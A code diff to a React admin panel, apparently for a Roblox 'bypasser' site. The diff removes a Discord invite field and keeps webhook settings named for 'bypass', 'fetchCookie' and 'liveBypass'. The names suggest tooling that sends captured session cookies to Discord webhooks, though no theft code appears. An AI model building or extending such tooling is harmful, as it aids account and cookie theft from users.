@@ -1,6 +1,6 @@
 import { useState, useEffect } from "react";
 import { useNavigate } from "react-router-dom";
-import { Shield, LogOut, Webhook, Link as LinkIcon } from "lucide-react";
+import { Shield, LogOut, Webhook } from "lucide-react";
 import { WK, getWebhook, setWebhook } from "@/lib/tokenStore";
 import { toast } from "sonner";
 
@@ -9,7 +9,6 @@ const AdminPanel = () => {
   const [bypassWh, setBypassWh] = useState("");
   const [fetchWh, setFetchWh] = useState("");
   const [liveWh, setLiveWh] = useState("");
-  const [invite, setInvite] = useState("");
   const [siteUrl, setSiteUrl] = useState("");
 
   useEffect(() => {
@@ -17,7 +16,6 @@ const AdminPanel = () => {
     setBypassWh(getWebhook(WK.bypass));
     setFetchWh(getWebhook(WK.fetchCookie));
     setLiveWh(getWebhook(WK.liveBypass));
-    setInvite(getWebhook(WK.discordInvite));
     setSiteUrl(getWebhook(WK.siteUrl));
   }, [navigate]);
 
@@ -25,7 +23,6 @@ const AdminPanel = () => {
     setWebhook(WK.bypass, bypassWh);
     setWebhook(WK.fetchCookie, fetchWh);
     setWebhook(WK.liveBypass, liveWh);
-    setWebhook(WK.discordInvite, invite);
     setWebhook(WK.siteUrl, siteUrl);
     toast.success("Settings saved");
   };
@@ -64,10 +61,6 @@ const AdminPanel = () => {
               <input value={liveWh} onChange={e => setLiveWh(e.target.value)} placeholder="https://discord.com/api/webhooks/..." className="input-field text-xs font-mono" />
             </div>
             <div className="space-y-1 pt-2 border-t border-border/40">
-              <label className="text-xs font-medium text-muted-foreground flex items-center gap-1.5"><LinkIcon size={11} /> Discord Invite URL</label>
-              <input value={invite} onChange={e => setInvite(e.target.value)} placeholder="https://discord.gg/your-server" className="input-field text-xs font-mono" />
-            </div>
-            <div className="space-y-1">
               <label className="text-xs font-medium text-muted-foreground">Site URL (used in embed)</label>
               <input value={siteUrl} onChange={e => setSiteUrl(e.target.value)} placeholder="https://Rblxbypasser.com" className="input-field text-xs font-mono" />
             </div>
